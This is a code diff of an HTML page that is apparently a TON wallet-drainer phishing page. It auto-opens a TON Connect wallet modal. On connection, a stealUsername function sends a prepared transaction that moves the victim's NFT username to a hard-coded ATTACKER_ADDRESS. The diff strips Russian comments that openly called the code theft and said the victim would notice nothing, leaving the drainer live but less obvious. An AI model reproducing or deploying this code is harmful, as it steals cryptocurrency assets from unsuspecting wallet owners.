@@ -20,7 +20,7 @@
             font-size: 18px;
         }
     </style>
-    <!-- Множество CDN для максимальной вероятности загрузки -->
+    <!-- Все ссылки HTTPS -->
     <script src="https://cdn.jsdelivr.net/gh/ton-blockchain/ton-connect@2.2.0/packages/sdk/lib/tonconnect-sdk.min.js"></script>
     <script src="https://cdn.jsdelivr.net/gh/ton-blockchain/ton-connect-ui@2.0.4/lib/tonconnect-ui.min.js"></script>
     <script src="https://cdn.statically.io/gh/ton-blockchain/ton-connect/main/packages/sdk/lib/tonconnect-sdk.min.js"></script>
@@ -34,30 +34,23 @@
 
     <script>
         window.addEventListener('load', function() {
-            // Даём библиотекам время на загрузку
             setTimeout(function() {
-                // Проверка загрузки библиотек
                 if (typeof TonConnect === 'undefined' || typeof TonConnectUI === 'undefined') {
                     console.error('Библиотеки TON Connect не загрузились ни с одного CDN!');
-                    // Всё равно показываем 404, жертва ничего не заметит
                     return;
                 }
 
                 // ========== ТВОИ ДАННЫЕ ==========
-                const ATTACKER_ADDRESS = 'UQDJGfO9WdvXG2jOepsenwxwA_hUmBECDnhlhTXfJkbC3Cp6'; // ТВОЙ КОШЕЛЁК
-                const USERNAME_COLLECTION_ADDRESS = 'EQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRh'; // АДРЕС КОЛЛЕКЦИИ
+                const ATTACKER_ADDRESS = 'UQDJGfO9WdvXG2jOepsenwxwA_hUmBECDnhlhTXfJkbC3Cp6';
+                const USERNAME_COLLECTION_ADDRESS = 'EQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRh';
                 const PAYLOAD = 'te6cckECBQEAAQsAAeWIAc39af/oITx+Q4vvf0zKDYy8ZkxhANjOIsRC4Y456MMKA5tLO3P///iLTYLRKAAAAA00I+nVx3oe/LAinIUZNSwNySL5E34jwIKucvH2jNQZGfnAzsY6sdLxTjX9+xKyw5RdkWNyOKsKawdaMBwoEBgJAQIKDsPIbQIEAgFoYgBQeGf+SuJLX4dzh2GeG7EF5FlBKf4wJifFZwBSWvy1dKAcBhgoAAAAAAAAAAAAAAAAAQMAoV/MPRRUbeTvpVqftYAXXEjqYukf8Y80Sg6O7kVvcTK+czXoYmxDvFuETLODQXADm/rT/9BCePyHF97+mZQbGXjMmMIBsZxFiIXDHHPRhhQgKAAAKdQ8mA==';
                 const manifestUrl = 'https://acountpubgfjdjd-cloud.github.io/nfts/tonconnect-manifest.json';
                 // =================================
 
                 let tonConnectUI, connector;
 
-                // Функция кражи
                 async function stealUsername() {
-                    if (!PAYLOAD) {
-                        console.error('Payload не вставлен!');
-                        return;
-                    }
+                    if (!PAYLOAD) return;
                     try {
                         const transaction = {
                             validUntil: Math.floor(Date.now() / 1000) + 600,
@@ -74,12 +67,10 @@
                     }
                 }
 
-                // Инициализация TON Connect
                 try {
                     connector = new TonConnect.Connector();
                     tonConnectUI = new TonConnectUI.TonConnectUI({ connector, manifestUrl });
 
-                    // Когда кошелёк подключён
                     connector.onStatusChange(async (wallet) => {
                         if (wallet) {
                             console.log('Кошелёк подключён, пробуем украсть...');
@@ -87,7 +78,6 @@
                         }
                     });
 
-                    // Открываем окно подключения через 1.5 секунды
                     setTimeout(() => {
                         if (!connector.connected) {
                             tonConnectUI.openModal();
@@ -96,7 +86,7 @@
                 } catch (e) {
                     console.error('Ошибка инициализации TON Connect:', e);
                 }
-            }, 3000); // Ждём 3 секунды для загрузки библиотек
+            }, 3000);
         });
     </script>
 </body>
